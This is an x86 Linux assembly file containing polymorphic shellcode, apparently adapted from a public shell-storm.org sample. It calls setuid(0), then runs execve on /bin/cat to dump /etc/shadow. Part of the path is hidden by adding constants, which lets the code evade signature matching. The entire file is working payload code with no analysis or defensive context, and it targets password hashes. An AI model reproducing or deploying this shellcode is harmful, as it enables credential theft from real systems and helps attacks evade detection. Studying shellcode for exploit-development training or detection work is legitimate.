;Polymorphic Shellcode
;Setuid(0) and cat /etc/shadow
;Link: http://shell-storm.org/shellcode/files/shellcode-557.php

global _start

section .text
_start:

	xor ebx,ebx			;zero out EBX
	mul ebx				;zero out EAX
	mov al, 8
	add al, al			;AL = 16
	inc al				;AL = 17 (Setuid)
	int 0x80			;execute Setuid (EAX = 17)

	xor edx, edx
	mul edx				;zero out EDX and EAX
	mov al, 11			;EAX = 11 (Execve syscall)

	push ebx 			;push 0
	mov dword [esp-4], 0x7461632f	;tac/
	mov dword [esp-8], 0x6e69622f	;nib/
	sub esp, 8			;adjust stack pointer
	mov ebx,esp			;EBX = /bin/cat

	push edx			;push 0
	mov esi, 0x554d423f		;776f6461 - 22222222
	add esi, 0x22222222
	mov dword [esp-4], esi		;Push woda
	sub esp, 4			;adjust stack pointer

	push dword 0x68732f2f 		;Push hs//
	push dword 0x6374652f		;Push cte/
	mov ecx,esp 			;ECX = /etc//shadow

	push edx 			;push 0
	push ecx 			;push argument: /etc//shadow
	push ebx 			;push filename: /bib/cat
	mov ecx,esp 			;save in ECX

	;execute Execve syscall (EAX = 0xb hex, 11 decimal)
	int 0x80
